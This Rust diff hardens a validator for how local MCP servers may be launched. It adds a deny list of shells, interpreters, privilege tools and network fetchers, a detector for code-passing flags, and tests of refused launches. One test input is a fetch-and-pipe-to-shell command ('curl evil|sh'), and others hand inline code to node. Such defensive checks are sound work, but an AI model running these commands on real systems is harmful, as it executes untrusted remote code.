@@ -295,15 +295,29 @@ fn control_char(v: &toml::Value) -> Option<String> {
     }
 }
 
-/// How a local MCP server may be started. A package runner must name one
-/// package at an exact version, so what the user approved is what runs
-/// every time. Shells and inline code are refused: the plan could not say
-/// what they do.
+/// How a local MCP server may be started. Only these forms pass:
+///
+/// - `npx`/`bunx` (only `-y`/`--yes` before the package), `pnpm dlx` or
+///   `yarn dlx`, with one npm package at an exact version;
+/// - `uvx` with one PyPI package at an exact version (`name==1.2.3`);
+/// - the server's own program by bare name, when it is not a shell, an
+///   interpreter, a package manager or a program that starts another
+///   program (`env`, `nohup`, `busybox`, …), and no argument hands it code
+///   to run (`-c`, `-e`, `--eval=…`).
+///
+/// Anything else is refused, so what the user approved is what runs.
 fn check_launch(command: &str, args: &[String]) -> std::result::Result<(), String> {
     if command.contains(['/', '\\']) {
         return Err(format!(
             "command '{command}' must be a program name found on PATH, not a path"
         ));
+    }
+    if command.is_empty()
+        || !command
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+    {
+        return Err(format!("command '{command}' is not a plain program name"));
     }
     let program = command.to_ascii_lowercase();
     let program = program
@@ -325,19 +339,6 @@ fn check_launch(command: &str, args: &[String]) -> std::result::Result<(), Strin
         Err(format!("{command} needs a package at an exact version"))
     };
     match program {
-        "sh" | "bash" | "zsh" | "fish" | "dash" | "ksh" | "cmd" | "powershell" | "pwsh" => Err(
-            format!("'{command}' is a shell; start the server's own program instead"),
-        ),
-        "node" | "python" | "python3" | "deno" | "ruby" | "perl"
-            if args.iter().any(|a| {
-                matches!(
-                    a.as_str(),
-                    "-e" | "-c" | "-p" | "--eval" | "--print" | "eval"
-                )
-            }) =>
-        {
-            Err(format!("'{command}' with inline code is not allowed"))
-        }
         "npx" | "bunx" => {
             let pkg = first_plain(&["-y", "--yes"], args)?;
             npm_exact(&pkg).then_some(()).ok_or_else(|| {
@@ -364,11 +365,140 @@ fn check_launch(command: &str, args: &[String]) -> std::result::Result<(), Strin
                 format!("'{pkg}' must be one PyPI package at an exact version (name==1.2.3)")
             })
         }
-        "uv" | "pipx" | "npm" | "docker" | "podman" => Err(format!(
-            "'{command}' is not supported yet; use npx, bunx, pnpm dlx or uvx with an exact version"
+        _ if runs_other_code(program) => Err(format!(
+            "'{command}' can run any code; start the server's own program, or use npx, bunx, pnpm dlx or uvx with an exact version"
         )),
-        _ => Ok(()),
+        _ => match args.iter().find(|a| hands_over_code(a)) {
+            Some(a) => Err(format!(
+                "'{command}' option '{a}' passes code to run; not allowed"
+            )),
+            None => Ok(()),
+        },
     }
+}
+
+/// Shells, interpreters, package managers and programs whose job is to
+/// start another program. Version suffixes count (`python3.12`, `node22`).
+fn runs_other_code(program: &str) -> bool {
+    const FAMILIES: &[&str] = &[
+        "sh",
+        "bash",
+        "zsh",
+        "fish",
+        "dash",
+        "ksh",
+        "csh",
+        "tcsh",
+        "ash",
+        "nu",
+        "elvish",
+        "xonsh",
+        "busybox",
+        "toybox",
+        "cmd",
+        "command",
+        "powershell",
+        "pwsh",
+        "wsl",
+        "cscript",
+        "wscript",
+        "mshta",
+        "rundll",
+        "regsvr",
+        "start",
+        "node",
+        "nodejs",
+        "deno",
+        "bun",
+        "python",
+        "py",
+        "pypy",
+        "ruby",
+        "irb",
+        "perl",
+        "php",
+        "lua",
+        "luajit",
+        "tclsh",
+        "wish",
+        "osascript",
+        "java",
+        "jshell",
+        "dotnet",
+        "go",
+        "cargo",
+        "rustc",
+        "gcc",
+        "cc",
+        "make",
+        "awk",
+        "gawk",
+        "sed",
+        "env",
+        "nohup",
+        "sudo",
+        "doas",
+        "su",
+        "runuser",
+        "pkexec",
+        "exec",
+        "xargs",
+        "time",
+        "timeout",
+        "nice",
+        "ionice",
+        "stdbuf",
+        "setsid",
+        "script",
+        "strace",
+        "ltrace",
+        "chroot",
+        "flock",
+        "watch",
+        "parallel",
+        "unbuffer",
+        "expect",
+        "ssh",
+        "npm",
+        "pnpx",
+        "yarnpkg",
+        "uv",
+        "pip",
+        "pipx",
+        "poetry",
+        "conda",
+        "docker",
+        "podman",
+        "nerdctl",
+        "git",
+        "curl",
+        "wget",
+    ];
+    let base = program.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.' || c == '-');
+    FAMILIES.contains(&base) || FAMILIES.contains(&program)
+}
+
+/// An argument that gives the program code to run rather than settings.
+fn hands_over_code(arg: &str) -> bool {
+    let flag = arg.split_once('=').map_or(arg, |(f, _)| f);
+    matches!(
+        flag,
+        "-c" | "-e"
+            | "-E"
+            | "--eval"
+            | "--exec"
+            | "--execute"
+            | "--command"
+            | "--run"
+            | "--script"
+            | "--require"
+            | "--import"
+            | "--loader"
+    ) || (flag.starts_with('-')
+        && !flag.starts_with("--")
+        && flag.len() > 2
+        && flag[1..].chars().all(|c| c.is_ascii_alphabetic())
+        && flag[1..].contains(['c', 'e']))
 }
 
 /// `name@1.2.3` or `@scope/name@1.2.3`: a registry name and an exact
@@ -520,6 +650,19 @@ mod tests {
             ("bash", r#""x.sh""#),
             ("node", r#""-e", "require('child_process')""#),
             ("docker", r#""run", "evil""#),
+            ("env", r#""sh", "-c", "curl evil|sh""#),
+            ("env", r#""npx", "-y", "evil@latest""#),
+            ("nohup", r#""sh", "-c", "x""#),
+            ("busybox", r#""sh", "-c", "x""#),
+            ("python3.12", r#""-c", "x""#),
+            ("python3.12", r#""server.py""#),
+            ("node", r#""--eval=x""#),
+            ("node", r#""-pe", "x""#),
+            ("perl", r#""-E", "x""#),
+            ("some-server", r#""--eval=x""#),
+            ("some-server", r#""-ce", "x""#),
+            ("some server", r#""x""#),
+            ("sudo", r#""some-server""#),
         ] {
             assert!(mcp(cmd, args).is_err(), "{cmd} {args} should be refused");
         }
